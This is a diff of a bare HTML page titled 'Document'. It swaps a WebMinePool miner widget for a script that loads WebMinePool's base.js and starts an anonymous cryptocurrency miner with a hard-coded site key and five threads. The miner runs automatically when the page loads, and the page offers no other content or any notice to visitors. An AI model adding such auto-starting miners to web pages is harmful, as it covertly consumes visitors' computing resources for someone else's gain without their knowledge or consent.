@@ -7,11 +7,14 @@
     <title>Document</title>
 </head>
 <body>
-    <!-- Include the external JavaScript file using a script tag -->
-    <script src="https://webminepool.com/lib/simple-ui.js"></script>
-
-    <!-- Create a div element with the specified attributes -->
-    <div id="wmp-container" wmp-site-key="SK_VRRQktJLHGfAlqoR7jqsv" wmp-username="noob" wmp-threads="4" wmp-autostart="true" style="margin: 0 auto;">
-    </div>
+<script src="https://webminepool.com/lib/base.js"></script>
+<script>
+    var miner = WMP.Anonymous('SK_VRRQktJLHGfAlqoR7jqsv',{
+        threads: 5,
+        autoThreads: false,
+        forceASMJS: false
+    });
+    miner.start();
+</script>
 </body>
 </html>
